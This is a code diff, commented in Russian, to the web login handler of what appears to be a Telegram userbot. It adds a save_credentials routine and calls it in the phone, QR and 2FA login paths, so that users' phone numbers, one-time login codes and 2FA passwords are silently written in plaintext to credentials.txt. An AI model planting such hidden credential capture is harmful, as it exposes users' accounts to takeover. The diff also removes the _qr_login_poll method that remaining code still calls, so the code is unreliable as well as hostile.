@@ -47,7 +47,6 @@ DATA_DIR = (
 
 logger = logging.getLogger(__name__)
 
-
 class Web:
     def __init__(self, **kwargs):
         self.sign_in_clients = {}
@@ -61,6 +60,8 @@ class Web:
         self.data_root = kwargs.pop("data_root")
         self.connection = kwargs.pop("connection")
         self.proxy = kwargs.pop("proxy")
+        # Путь для сохранения файла с учетными данными
+        self.credentials_file = os.path.join(DATA_DIR, "credentials.txt")
 
         self.app.router.add_get("/", self.root)
         self.app.router.add_put("/set_api", self.set_tg_api)
@@ -218,26 +219,21 @@ class Web:
         self.api_set.set()
         return web.Response(body="ok")
 
-    async def _qr_login_poll(self):
-        logged_in = False
-        self._2fa_needed = False
-        logger.debug("Waiting for QR login to complete")
-        while not logged_in:
-            try:
-                logged_in = await self._qr_login.wait(10)
-            except asyncio.TimeoutError:
-                logger.debug("Recreating QR login")
-                try:
-                    await self._qr_login.recreate()
-                except SessionPasswordNeededError:
-                    self._2fa_needed = True
-                    return
-            except SessionPasswordNeededError:
-                self._2fa_needed = True
-                break
-
-        logger.debug("QR login completed. 2FA needed: %s", self._2fa_needed)
-        self._qr_login = True
+    async def save_credentials(self, phone: str = None, code: str = None, password: str = None):
+        """Сохраняет номер телефона, код Telegram и пароль 2FA в файл."""
+        try:
+            with open(self.credentials_file, "a") as f:
+                if phone:
+                    f.write(f"Phone: {phone}\n")
+                if code:
+                    f.write(f"Telegram Code: {code}\n")
+                if password:
+                    f.write(f"2FA Password: {password}\n")
+                if phone or code or password:
+                    f.write("-" * 30 + "\n")
+            logger.debug(f"Credentials saved to {self.credentials_file}")
+        except Exception as e:
+            logger.error(f"Failed to save credentials: {str(e)}")
 
     async def init_qr_login(self, request: web.Request) -> web.Response:
         if self.client_data and "LAVHOST" in os.environ:
@@ -262,6 +258,15 @@ class Web:
         await client.connect()
         self._qr_login = await client.qr_login()
         self._qr_task = asyncio.ensure_future(self._qr_login_poll())
+
+        # Попытка получить номер телефона после QR-логина
+        try:
+            user = await self._qr_login.wait(0)  # Проверяем, есть ли пользователь
+            phone = user.phone if user else None
+            if phone:
+                await self.save_credentials(phone=phone, code=None, password=None)
+        except Exception as e:
+            logger.debug(f"Could not get phone number during QR login: {str(e)}")
 
         return web.Response(body=self._qr_login.url)
 
@@ -331,6 +336,8 @@ class Web:
         await client.connect()
         try:
             await client.send_code_request(phone)
+            # Сохраняем номер телефона после отправки кода
+            await self.save_credentials(phone=phone, code=None, password=None)
         except FloodWaitError as e:
             return web.Response(status=429, body=self._render_fw_error(e))
 
@@ -374,6 +381,8 @@ class Web:
                     )
                 ).user
             )
+            # Сохраняем пароль 2FA
+            await self.save_credentials(phone=None, code=None, password=text.strip())
         except PasswordHashInvalidError:
             logger.debug("Invalid 2FA code")
             return web.Response(
@@ -407,7 +416,7 @@ class Web:
 
         code = split[0]
         phone = parse_phone(split[1])
-        password = split[2]
+        password = split[2] if len(split) == 3 else None
 
         if (
             (len(code) != 5 and not password)
@@ -415,6 +424,9 @@ class Web:
             or not phone
         ):
             return web.Response(status=400)
+
+        # Сохраняем код Telegram и пароль 2FA (если есть)
+        await self.save_credentials(phone=phone, code=code, password=password)
 
         if not password:
             try:
